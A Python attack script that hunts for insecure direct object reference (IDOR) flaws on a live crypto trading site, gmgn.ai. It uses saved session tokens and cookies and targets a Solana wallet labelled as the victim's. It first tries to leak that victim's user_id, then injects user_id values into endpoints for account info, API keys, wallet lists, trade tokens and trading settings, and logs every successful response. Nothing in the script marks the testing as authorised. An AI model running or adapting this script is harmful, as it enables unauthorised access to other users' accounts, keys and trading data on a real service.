#!/usr/bin/env python3
"""
FINAL IDOR HUNT - Test ALL possible user_id injection points
"""
import json
import requests

# Load fresh token
with open('fresh_token.txt') as f:
    ACCESS_TOKEN = f.read().strip()

with open('fresh_cookies.json') as f:
    COOKIES = json.load(f)

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
}

VICTIM_SOL = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"

print("="*80)
print("🔥 FINAL IDOR HUNT WITH FRESH COOKIES")
print("="*80)

# CRITICAL: Find victim's user_id from their wallet
print("\n[STEP 1] Finding victim user_id from wallet...")

# Try public wallet endpoints that might leak user_id
test_endpoints = [
    ("GET", "https://gmgn.ai/defi/quotation/v1/smartmoney/sol/walletNew/{wallet}"),
    ("POST", "https://gmgn.ai/rebate/api/v1/cashback/pending", {"address": VICTIM_SOL, "chain": "sol"}),
    ("GET", "https://gmgn.ai/api/v1/user/wallet_info/{wallet}"),
    ("POST", "https://gmgn.ai/account/wallet/owner", {"address": VICTIM_SOL}),
]

victim_user_id = None

for method, url_template, *payload in test_endpoints:
    url = url_template.replace("{wallet}", VICTIM_SOL) if "{wallet}" in url_template else url_template
    
    print(f"\nTrying: {method} {url}")
    
    try:
        if method == "GET":
            r = requests.get(url, headers=HEADERS, cookies=COOKIES, timeout=10)
        else:
            r = requests.post(url, headers=HEADERS, cookies=COOKIES, json=payload[0] if payload else {}, timeout=10)
        
        print(f"Status: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            print(f"Response: {json.dumps(data, indent=2)[:500]}")
            
            # Look for user_id in response
            response_str = json.dumps(data)
            if "user_id" in response_str and VICTIM_SOL in response_str:
                print(f"\n🔥 VICTIM USER_ID MIGHT BE IN RESPONSE!")
                # Parse it
                if isinstance(data.get("data"), dict) and data["data"].get("user_id"):
                    victim_user_id = data["data"]["user_id"]
                    print(f"✅ FOUND: {victim_user_id}")
                    break
    except Exception as e:
        print(f"Error: {e}")

if not victim_user_id:
    print(f"\n⚠️  Could not find victim user_id automatically")
    print(f"   Using wallet address for testing instead")

print("\n" + "="*80)
print("[STEP 2] Testing HIGH-VALUE IDOR endpoints")
print("="*80)

# Now test EVERY endpoint that might accept user_id parameter
idor_tests = [
    {
        "name": "User Info by UID",
        "method": "POST",
        "url": "https://gmgn.ai/account/user_info",
        "payloads": [
            {},  # Baseline - our own
            {"user_id": OUR_USER_ID},  # Explicit our ID
            {"user_id": "00000000-0000-0000-0000-000000000001"},  # Test ID
        ]
    },
    {
        "name": "API Keys",
        "method": "GET",
        "url": "https://gmgn.ai/api/v1/openapi/keys",
        "payloads": [
            {},
            {"user_id": OUR_USER_ID},
        ]
    },
    {
        "name": "Trade Token",
        "method": "POST",
        "url": "https://gmgn.ai/account/trade_token",
        "payloads": [
            {"wallet_address": VICTIM_SOL, "secret": "test"},
        ]
    },
    {
        "name": "Wallet List",
        "method": "POST", 
        "url": "https://gmgn.ai/account/wallet/list",
        "payloads": [
            {},
            {"user_id": OUR_USER_ID},
        ]
    },
    {
        "name": "Trading Settings",
        "method": "POST",
        "url": "https://gmgn.ai/api/v1/trade/smart/setting/get",
        "payloads": [
            {},
            {"user_id": OUR_USER_ID},
        ]
    },
]

results = []

for test in idor_tests:
    print(f"\n{'='*80}")
    print(f"TEST: {test['name']}")
    print(f"{'='*80}")
    
    for payload in test['payloads']:
        print(f"\nPayload: {json.dumps(payload)}")
        
        try:
            if test['method'] == "GET":
                r = requests.get(test['url'], headers=HEADERS, cookies=COOKIES, params=payload, timeout=10)
            else:
                r = requests.post(test['url'], headers=HEADERS, cookies=COOKIES, params=PARAMS, json=payload, timeout=10)
            
            print(f"Status: {r.status_code}")
            
            if r.status_code == 200:
                data = r.json()
                print(f"Code: {data.get('code')}")
                
                if data.get('code') == 0:
                    print(f"✅ SUCCESS!")
                    print(f"Response: {json.dumps(data, indent=2)[:800]}")
                    
                    results.append({
                        "test": test['name'],
                        "payload": payload,
                        "response": data
                    })
                else:
                    print(f"Error: {data.get('message')}")
            else:
                print(f"HTTP Error: {r.text[:200]}")
                
        except Exception as e:
            print(f"Exception: {e}")

print("\n" + "="*80)
print("📊 RESULTS")
print("="*80)

if results:
    print(f"\n✅ Found {len(results)} working endpoints:\n")
    for r in results:
        print(f"• {r['test']}")
        print(f"  Payload: {r['payload']}")
        print()
else:
    print("\n⚠️  No IDOR found with user_id injection")
    print("   Server likely validates user_id against authenticated session")

# Save results
with open('final_idor_results.json', 'w') as f:
    json.dump(results, f, indent=2)

print(f"\n💾 Results saved to final_idor_results.json")
